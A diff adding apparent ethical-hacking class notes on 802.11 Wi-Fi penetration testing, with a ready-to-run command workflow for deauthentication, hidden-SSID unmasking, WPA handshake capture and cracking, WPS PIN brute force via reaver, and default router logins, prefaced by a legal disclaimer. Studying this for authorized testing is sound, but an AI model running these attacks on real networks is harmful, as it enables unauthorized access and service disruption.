@@ -1,4 +1,215 @@
 
+While you missed the live action, the agenda covered core **802.11 wireless penetration testing fundamentals**—specifically moving beyond the outdated myth that modern Wi-Fi encryption has rendered wireless attacks obsolete.
+
+Here is a breakdown of the key concepts, technical setups, and attack methodologies covered during the session:
+
+---
+
+### **1. Hardware & Environment Setup**
+
+Before executing any wireless attacks, standard Network Interface Cards (NICs) must be configured for deep packet inspection.
+
+* **Monitor Mode vs. Managed Mode:** Standard Wi-Fi cards operate in *Managed Mode* (only processing packets intended for their specific MAC address). Attacks require forcing the wireless adapter into *Monitor Mode* (promiscuous mode for 802.11) to intercept all ambient radio traffic across a target channel without associating with an Access Point (AP).
+* **Common Tooling:** Command-line suite setup using `airmon-ng start wlan0` or `iwconfig`.
+
+---
+
+### **2. Wireless Reconnaissance & Traffic Analysis**
+
+The session demonstrated how attackers map out target wireless networks passively and actively.
+
+* **Finding AP Channels & Client MACs:** Using tools like `airodump-ng` or `Kismet` to sweep 2.4 GHz and 5 GHz frequency spectrums, identifying targeted BSSIDs (AP MAC addresses), operational channels, signal strength (RSSI), and connected client station MAC addresses.
+* **Analyzing Probe Requests:** Mobile devices constantly broadcast "Probe Requests" searching for previously saved SSIDs. Intercepting these unencrypted broadcast frames exposes a device’s network history, revealing potential targets for rogue access point attacks.
+
+---
+
+### **3. Unmasking Hidden ESSIDs**
+
+Disabling SSID broadcasting is often used as security through obscurity, but it does not stop packet capture.
+
+* **The Technique:** Access Points hiding their ESSID still include the network name in specific management frames (such as `Reassociation Request` or `Probe Response` frames when a legitimate client connects).
+* **Exploitation:** Attackers force a client to reconnect—often using targeted deauthentication frames (`aireplay-ng --deauth`)—capturing the cleartext ESSID from the reconnecting client’s response frame.
+
+---
+
+### **4. Router Credentials & Misconfiguration Exploitation**
+
+The workshop concluded with exploiting administrative weaknesses once network access or proximity is established.
+
+* **Default Credentials:** Exploiting factory-default admin logins (e.g., `admin:admin`, `admin:password`) on router web management interfaces due to unchanged vendor settings.
+* **WPS & Legacy Vulnerabilities:** Scanning for enabled Wi-Fi Protected Setup (WPS) PIN vulnerabilities using tools like `Reaver` or `Bully` to bypass complex WPA/WPA2 passphrases entirely.
+
+---
+---
+---
+Here is the complete step-by-step workflow for executing a standard 802.11 wireless penetration testing assessment based on the webinar's agenda.
+
+> **Legal Disclaimer:** Performing wireless attacks on networks without explicit, written authorization from the owner is illegal. This guide is strictly for educational and authorized penetration testing purposes.
+
+---
+
+### Phase 1: Wireless Adapter & Environment Setup
+
+Before capturing raw 802.11 frames, you must identify your interface and switch it from Managed Mode to Monitor Mode.
+
+1. **Identify your wireless network card:**
+```bash
+ip link show
+# or
+iwconfig
+
+```
+
+*Note your wireless interface name (e.g., `wlan0` or `wlan0mon`).*
+2. **Kill interfering network processes:**
+Network managers automatically try to re-assign your card to Managed Mode. Kill these background tasks:
+```bash
+sudo airmon-ng check kill
+
+```
+
+3. **Enable Monitor Mode:**
+```bash
+sudo airmon-ng start wlan0
+
+```
+
+*Verify the interface name changes (typically to `wlan0mon`). Confirm by running `iwconfig` and verifying `Mode:Monitor`.*
+
+---
+
+### Phase 2: Reconnaissance & Target Identification
+
+1. **Perform a broad spectrum scan:**
+Listen across all active channels (2.4 GHz and/or 5 GHz) to discover visible and hidden Access Points (APs) along with connected stations (clients):
+```bash
+sudo airodump-ng wlan0mon
+
+```
+
+*Observe the output list:*
+* **BSSID:** MAC address of the Access Point.
+* **PWR:** Signal strength (closer to 0 is stronger, e.g., -40 dBm is stronger than -80 dBm).
+* **CH:** Operating channel.
+* **ESSID:** Network name (if hidden, it appears as `<length: 0>`).
+
+2. **Target a specific AP and channel:**
+Lock your card onto the target AP's channel and record captured packets to a file for analysis:
+```bash
+sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w target_capture wlan0mon
+
+```
+
+---
+
+### Phase 3: Unmasking Hidden ESSIDs & Probe Request Analysis
+
+#### Unmasking a Hidden ESSID
+
+A hidden network omits its name from standard beacon frames. To reveal it, force a connected client to re-associate so its device sends the ESSID in cleartext.
+
+1. **Open a new terminal while `airodump-ng` is actively capturing on the targeted channel.**
+2. **Send targeted deauthentication frames to a connected client station:**
+```bash
+sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+
+```
+
+* `-a`: Target AP BSSID
+* `-c`: Target Client MAC address
+
+3. **Observe your `airodump-ng` window:** As the client automatically reconnects, the hidden `<length: 0>` ESSID populates with the actual cleartext network name.
+
+#### Analyzing Client Probe Requests
+
+1. Review the bottom section of your `airodump-ng` screen under **Probes**.
+2. Note SSIDs broadcasted by unassociated client devices searching for previously saved networks. These can be logged or analyzed using Wireshark:
+```bash
+wireshark target_capture-01.cap
+
+```
+
+*Filter expression:* `wlan.fc.type_subtype == 0x04` (Probe Requests).
+
+---
+
+### Phase 4: Exploitation & Gaining Access
+
+Once you have identified the target, you can proceed with exploitation using either credential recovery or configuration flaws.
+
+#### Option A: WPA/WPA2 Handshake Capture & Cracking
+
+1. Keep `airodump-ng` running on the target BSSID and channel.
+2. Issue a brief deauthentication frame to capture the 4-Way Handshake upon client re-connection:
+```bash
+sudo aireplay-ng --deauth 2 -a 00:11:22:33:44:55 wlan0mon
+
+```
+
+3. Check the top-right corner of your `airodump-ng` terminal for the confirmation banner: `WPA handshake: 00:11:22:33:44:55`.
+4. Crack the captured handshake offline using `aircrack-ng` or `hashcat`:
+```bash
+sudo aircrack-ng -w /path/to/wordlist.txt target_capture-01.cap
+
+```
+
+#### Option B: WPS Vulnerability Exploitation (If WPS is Enabled)
+
+If the router uses legacy Wi-Fi Protected Setup (WPS):
+
+1. Scan for WPS-enabled targets:
+```bash
+sudo wash -i wlan0mon
+
+```
+
+2. Run an online brute-force attack against the 8-digit WPS PIN:
+```bash
+sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
+
+```
+
+---
+
+### Phase 5: Post-Exploitation & Default Credential Exploitation
+
+1. **Stop Monitor Mode and Connect:**
+Return your interface to standard mode and connect to the network using the recovered PSK:
+```bash
+sudo airmon-ng stop wlan0mon
+sudo systemctl start NetworkManager
+
+```
+
+2. **Locate the Default Gateway (Router IP):**
+```bash
+ip route show | grep default
+# Example output: default via 192.168.1.1 dev wlan0
+
+```
+
+3. **Test Default Administrative Credentials:**
+Access the web interface at `[http://192.168.1.1](http://192.168.1.1)` in a browser or command line, testing common vendor-default credentials:
+* `admin` : `admin`
+* `admin` : `password`
+* `root` : `admin`
+* `admin` : *[blank]*
+
+---
+
+### Phase 6: Post-Assessment Cleanup
+
+Always restore your network configuration to its default state after testing:
+
+```bash
+sudo airmon-ng stop wlan0mon
+sudo systemctl restart NetworkManager
+
+```
+
+---
+---
+---
 
 # **Complete Wi-Fi Attack Overview for Beginners (Ethical Hacking Class Notes)**
 
